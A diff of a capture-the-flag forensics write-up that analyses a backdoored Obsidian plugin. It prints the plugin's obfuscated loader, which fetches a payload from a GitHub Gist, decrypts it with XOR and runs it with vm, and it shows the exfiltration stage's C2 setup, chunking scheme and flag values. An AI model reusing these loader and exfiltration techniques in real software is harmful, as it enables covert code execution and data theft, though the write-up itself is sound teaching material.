@@ -13,25 +13,16 @@
 
 ## Overview
 
-This forensics challenge simulates a real-world insider-threat / malware-in-the-wild scenario. Players are given a snapshot of a compromised user's home directory and a locked archive, and must:
+This is a forensics challenge simulates a real-world problems / malware scenario. Players are given a snapshot of a compromised user's home directory **users-dir.zip** and a locked archive **chall.7z** 
 
-1. Identify a malicious, obfuscated plugin hidden inside the user's profile.
-2. Reverse-engineer a multi-stage obfuscation chain to recover and decrypt a remotely-fetched JavaScript payload.
-3. Reconstruct the exfiltrated file from a network capture.
-4. Extract the final flag embedded in the recovered file.
-
----
-
-## Provided Files
-
-```
-users-dir.zip   — snapshot of the victim's home directory  
-chall.7z        — password-protected archive (password discovered during the challenge)
-```
+>> Identify a malicious plugin hidden inside the user's home dir .
+>> Revers a multi-stage obfuscation chain to recover and decrypt JavaScript payload.
+>> recover the exfiltrated file from a network capture.
+>> Extract the final flag embedded in the recovered file from the network connection.
 
 ---
 
-## Step 1 — Extract the User's Directory
+## Step 1 — Extract the User's Directory (users-dir.zip)
 
 The first step is to unzip `users-dir.zip` to examine the victim's file system.
 
@@ -43,7 +34,7 @@ unzip users-dir.zip
 
 This produces a full Windows-style user profile tree rooted at `Users/serj/`.
 
-### Directory Tree (abbreviated)
+### Directory Tree :
 
 ```
 Users/serj/
@@ -66,22 +57,22 @@ Users/serj/
 
 ### Analysis
 
-- **Desktop**: Contains two legitimate, well-known open-source repositories (`Apollo-11-master`, `mal-cli`). No malicious content.
-- **Documents/Memes**: Three markdown files with CTF-themed jokes. No hidden data.
-- **Documents/.obsidian**: A hidden [Obsidian](https://obsidian.md) configuration folder. The `plugins/read-it-later-sync/` subdirectory is the only third-party plugin — and the primary target.
+- **Desktop**: Contains two open-source repositories (`Apollo-11-master`, `mal-cli`). (No malicious content).
+- **Documents/Memes**: Three markdown files with CTF-themed jokes. (No hidden data).
+- **Documents/.obsidian**: A hidden **Obsidian** configuration folder. The `plugins/read-it-later-sync/` directory is the only third-party plugin — and the primary target.
 
 ![Plugin files discovered in .obsidian](pics/Screenshot_From_2026-08-04_23-48-13.png)
 
 ---
 
-## Step 2 — Analysing `main.js` — The Malicious Plugin
+## Step 2 — Analysing `main.js` — (The Malicious Plugin)
 
-The plugin presents itself as a legitimate "read-it-later" inbox synchroniser, which is an excellent cover for a backdoor: it makes periodic outbound network connections as part of its normal operation.
+The plugin presents itself as a legitimate "read-it-later" inbox synchroniser, which is an excellent cover for a **backdoor**: it makes periodic outbound network connections as part of its normal operation.
 
 ### 2.1 — Normal Functionality
 
 ```
-Inbox Server → GET articles → Fetch webpage → Extract metadata → Create Markdown note → Delete item
+Inbox Server > GET articles > Fetch webpage > Extract data > Create .txt note > Delete item
 ```
 
 Default configuration:
@@ -96,7 +87,7 @@ This is entirely plausible behaviour for such a plugin, making detection harder.
 
 ### 2.2 — The Hidden `syncHelper()` Backdoor
 
-Buried inside `main.js` is a function named `syncHelper()` that goes far beyond normal sync logic.
+Buried inside `main.js` is a function named `syncHelper()` that is doing somethings that shouldn't be done.
 
 #### Stage 1 — URL Obfuscation via Base64 Concatenation
 
@@ -106,15 +97,14 @@ const stg = "aHR0cHM6Ly9hcGkuZ2l0aH" + rif;
 const url = atob(stg + "NjdiOTZiZWYzZGIzZTU1MjdlZmI4YjVhMg");
 ```
 
-The real URL is never written in plaintext. Instead, three Base64 fragments are concatenated and decoded at runtime with `atob()`:
+The real URL isn't written in plaintext. Instead, three Base64 fragments are concatenated and decoded with `atob()`:
 
 ```
 "aHR0cHM6Ly9hcGkuZ2l0aH" + "iLmNvbS9naXN0cy8wMmZlYTM2" + "NjdiOTZiZWYzZGIzZTU1MjdlZmI4YjVhMg"
-      ↓  atob()
+      ᐯ  atob()
 https://api.github.com/gists/02fea3667b96bef3db3e5527efb8b5a2
 ```
 
-This obfuscation technique defeats simple string-based searches and static analysis tools.
 
 #### Stage 2 — Remote Payload Download
 
@@ -129,8 +119,6 @@ const response = await requestUrl({
 });
 ```
 
-The `?t=<timestamp>` parameter is appended to every request to bypass HTTP caches and make each URL unique.
-
 #### Stage 3 — Extracting the Hidden Payload
 
 ```js
@@ -139,15 +127,15 @@ const file  = jsonn.files['.txt'];
 const payload = JSON.parse(file.content);
 ```
 
-The GitHub Gist returns a JSON response. Inside it, a file named `.txt` carries a JSON-encoded payload containing a `data` field.
+The GitHub Gist returns a JSON response. Inside it,JSON encoded data payload contained on `data` field.
 
 #### Stage 4 — Base64 Decoding (Obfuscated)
 
 Even the string `"base64"` is obfuscated:
 
 ```js
-const b   = 'esab'.split('').reverse().join('');  // → "base"
-const ser = b + '64';                              // → "base64"
+const b   = 'esab'.split('').reverse().join('');  // > "base"
+const ser = b + '64';                              // > "base64"
 
 const eByt = Buffer.from(payload.data, ser);
 ```
@@ -163,7 +151,7 @@ const lines  = source.split('\n');
 // For each line:  key_byte = (sum_of_charCodes * line_length) & 0xFF
 ```
 
-This is a clever self-referential technique: the key is regenerated at runtime from the function body, so it changes if anyone tries to patch the code.
+This is a smart self-referential technique: the key is regenerated at runtime from the function body, so it changes if anyone tries to patch the code.
 
 ```js
 const eByt = Buffer.from(payload.data, ser);
@@ -243,7 +231,7 @@ the **syncHelper()** function source code that used to generate the XOR key  :
 
 #### Stage 6 — Dynamic Code Execution via `vm`
 
-After decryption, the recovered JavaScript is executed inside a sandboxed context:
+After decryption, the recovered JavaScript is executed inside a sandboxed :
 
 ```js
 const syncer = require(String.fromCharCode(118, 109));
@@ -253,7 +241,7 @@ syncer.createContext(context);
 syncer.runInContext(scr, context, { filename: 'inbox-sync.js' });
 ```
 
-The `vm` module name itself is encoded as character codes to evade string-matching detections.
+The `vm` module name itself is encoded as character codes
 
 The execution context exposes: `fetch`, `requestUrl`, `Buffer`, `process`, `require`, and timer functions — giving the remote payload full system access.
 
@@ -261,17 +249,17 @@ The execution context exposes: `fetch`, `requestUrl`, `Buffer`, `process`, `requ
 
 ```
 Concatenate 3 × Base64 fragments
-       ↓  atob()
+        ᐯ  atob()
 Remote GitHub Gist URL
-       ↓  HTTP GET (with cache-busting timestamp)
+       ᐯ  HTTP GET (with cache-busting timestamp)
 JSON response  →  files[".txt"]  →  content
-       ↓  JSON.parse
+       ᐯ  JSON.parse
 payload.data  →  Base64 decode
-       ↓
+       ᐯ
 Encrypted bytes  →  XOR (key derived from syncHelper source)
-       ↓
+       ᐯ
 JavaScript source code
-       ↓
+       ᐯ
 vm.runInContext()  →  arbitrary code execution
 ```
 
@@ -279,10 +267,10 @@ vm.runInContext()  →  arbitrary code execution
 
 ## Step 3 — Visiting the GitHub Gist
 
-Navigating to the decoded URL reveals a private Gist (`description: "oushou"`) containing the hidden `.txt` payload with a base64+XOR-encrypted JavaScript dropper.
 
 ![GitHub API response showing the hidden Gist payload](pics/Screenshot_From_2026-08-04_23-59-24.png)
 
+as you can see the the JSON encoded data contained as value of content JSON-key  
 ---
 
 ## Step 4 — Recovering the XOR Key & Decrypting the Payload
@@ -301,7 +289,7 @@ The output is: `57 8 128 0 26 41 0 88 186 10 190 182 …`
 
 ### 4.2 — Decrypting the Payload in CyberChef
 
-Using CyberChef with the **From Base64** and **XOR** operations (key: `153 217 101` in DECIMAL mode, Standard scheme), we decrypt the Gist payload and reveal the second-stage JavaScript:
+Using CyberChef with the **From Base64** and **XOR** operations (key: `153 217 101` in DECIMAL mode, Standard scheme), we decrypt the payload and find the second-stage JavaScript:
 
 ![CyberChef — From Base64 + XOR decryption revealing the exfiltration script](pics/Screenshot_From_2026-08-05_00-03-14.png)
 
@@ -314,7 +302,7 @@ The decrypted code is a full Node.js file-exfiltration tool. Its key properties:
 ### Configuration
 
 ```js
-const AES_KEY_TEXT = "itc{oushou_n_takhsayt_??!_YESSSS";  // ← FLAG PART 1
+const AES_KEY_TEXT = "itc{oushou_n_takhsayt_??!_YESSSS";  // < FLAG PART 1
 const C2_HOST      = '127.0.0.1';
 const C2_PORT      = 5000;
 const COLLECT_PATH = '/inbox';
@@ -326,22 +314,22 @@ const COLLECT_PATH = '/inbox';
 
 ```
 ~/Documents/important/   (target directory)
-         ↓  readFileSync()
+         ᐯ  readFileSync()
     File bytes
-         ↓  AES-256-CBC (random IV, key = AES_KEY_TEXT)
+         ᐯ  AES-256-CBC (random IV, key = AES_KEY_TEXT)
     IV ‖ ciphertext
-         ↓  .toString('hex')
+         ᐯ  .toString('hex')
     HEX string
-         ↓  JSON.stringify  →  zlib DEFLATE  →  HEX
+         ᐯ  JSON.stringify  >  zlib DEFLATE  >  HEX
     Compressed hex
-         ↓  split into 600-character chunks
-         ↓  each chunk → part1.part2.part3  (fake-JWT format)
-         ↓  HTTP GET  →  Authorization: Bearer <chunk>
+         ᐯ  split into 600-character chunks
+         ᐯ  each chunk > part1.part2.part3  (fake-JWT format)
+         ᐯ  HTTP GET  >  Authorization: Bearer <chunk>
     http://127.0.0.1:5000/inbox
 ```
 > **Note:** you can read the secript on **solver/secript.js**
 
-### Steganographic Metadata in User-Agent
+### exfiltration data in User-Agent
 
 ```js
 'User-Agent': `Mozilla/5.0 (Windows NT ${fileNumber}.${chunkIndex + 1}; Win64; x64) ...`
@@ -353,7 +341,7 @@ The file number and chunk index are hidden inside a realistic-looking User-Agent
 
 ## Step 6 — Unlocking `chall.7z`
 
-The AES key discovered in the script (`itc{oushou_n_takhsayt_??!_YESSSS`) is also the password for the locked `chall.7z` archive. Extracting it yields a **network packet capture (PCAP)** of the malware's exfiltration session.
+The AES key discovered in the script (`itc{oushou_n_takhsayt_??!_YESSSS`) is also the password for the locked `chall.7z` archive.(contain pcap file of the malware connection)
 
 ---
 
@@ -394,7 +382,7 @@ js_malware_is_another_world}
 
 ---
 
-## Flag Assembly
+## Flag gathering  
 
 | Source | Value |
 |--------|-------|
